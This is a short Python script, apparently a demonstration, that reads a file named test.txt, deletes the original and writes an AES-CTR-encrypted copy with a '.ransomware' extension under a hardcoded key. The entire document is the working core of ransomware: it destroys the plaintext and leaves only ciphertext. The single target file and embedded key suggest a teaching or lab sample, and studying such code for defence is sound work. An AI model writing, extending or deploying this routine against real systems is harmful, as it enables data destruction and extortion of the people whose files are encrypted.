import os
import sys
import pyaes

## open the file
file_name = 'test.txt'
file = open(file_name,'rb')
file_data=file.read()
file.close()

## delete the base file
os.remove(file_name)

## generate the encrypt key
key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key)

## encrypt the data
crypto_data = aes.encrypt(file_data)

## save the data in the new file
new_file = file_name + '.ransomware'
new_file = open(f'{new_file}','wb')
new_file.write((crypto_data))
new_file.close()

